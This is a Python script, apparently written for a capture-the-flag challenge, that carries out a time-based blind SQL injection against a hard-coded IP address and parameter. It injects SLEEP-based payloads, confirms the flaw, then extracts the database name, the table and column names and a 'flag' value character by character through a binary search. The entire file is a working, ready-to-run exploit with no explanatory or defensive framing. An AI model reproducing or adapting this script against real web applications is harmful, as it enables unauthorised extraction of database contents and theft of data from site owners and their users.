#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import time

URL = "http://47.120.61.230:33116/"
PARAM = "kw"

SLEEP_TIME = 2.5
TIMEOUT = 3
THRESHOLD = 2.0

PAYLOAD_TPL = "' AND IF(({cond}),SLEEP({sleep}),0)-- -"

session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0"
})


def request_with_cond(cond: str):
    payload = PAYLOAD_TPL.format(cond=cond, sleep=SLEEP_TIME)
    params = {
        PARAM: payload
    }

    start = time.time()
    try:
        r = session.get(URL, params=params, timeout=TIMEOUT)
        cost = time.time() - start
        return cost, r.status_code, len(r.text)
    except requests.exceptions.ReadTimeout:
        return TIMEOUT, "timeout", 0
    except Exception as e:
        print("[!] Request error:", e)
        return 0, "error", 0


def is_true(cond: str) -> bool:
    cost, status, length = request_with_cond(cond)
    print(f"    cond={cond[:80]}... cost={cost:.3f}s status={status} len={length}")
    return cost >= THRESHOLD


def health_check():
    try:
        r = session.get(URL, params={PARAM: "1"}, timeout=5)
        print(f"[*] Health check: status={r.status_code}, len={len(r.text)}")
        if r.status_code >= 500:
            print("[-] Target returned 5xx. Backend may be unavailable.")
            return False
        return True
    except Exception as e:
        print("[-] Health check failed:", e)
        return False


def test_sqli():
    print("[*] Testing time-based SQL injection...")

    true_result = is_true("1=1")
    false_result = is_true("1=2")

    if true_result and not false_result:
        print("[+] Time-based SQLi confirmed.")
        return True

    print("[-] Time-based SQLi not confirmed.")
    print("    Possible reasons:")
    print("    1. Wrong port or expired instance")
    print("    2. Payload closure changed")
    print("    3. WAF/rate limit/network jitter")
    print("    4. Parameter is not kw in this instance")
    return False


def get_length(expr: str, max_len: int = 200) -> int:
    print(f"[*] Getting length of: {expr}")
    for i in range(1, max_len + 1):
        if is_true(f"LENGTH(({expr}))={i}"):
            print(f"[+] Length: {i}")
            return i
    raise RuntimeError("Length not found")


def get_char(expr: str, pos: int) -> str:
    low, high = 32, 126

    while low <= high:
        mid = (low + high) // 2
        cond = f"ASCII(SUBSTRING(({expr}),{pos},1))>{mid}"

        if is_true(cond):
            low = mid + 1
        else:
            high = mid - 1

    return chr(low)


def dump_expr(expr: str, max_len: int = 200) -> str:
    length = get_length(expr, max_len)
    result = ""

    for pos in range(1, length + 1):
        ch = get_char(expr, pos)
        result += ch
        print(f"\r[+] Current: {result}", end="", flush=True)

    print()
    return result


def main():
    if not health_check():
        return

    if not test_sqli():
        return

    db = dump_expr("DATABASE()", 80)
    print("[+] database():", db)

    tables = dump_expr(
        f"SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{db}'",
        300
    )
    print("[+] tables:", tables)

    columns = dump_expr(
        f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='{db}' AND table_name='flag_table'",
        300
    )
    print("[+] flag_table columns:", columns)

    flag = dump_expr("SELECT flag FROM flag_table LIMIT 1", 200)
    print("[+] FLAG:", flag)


if __name__ == "__main__":
    main()
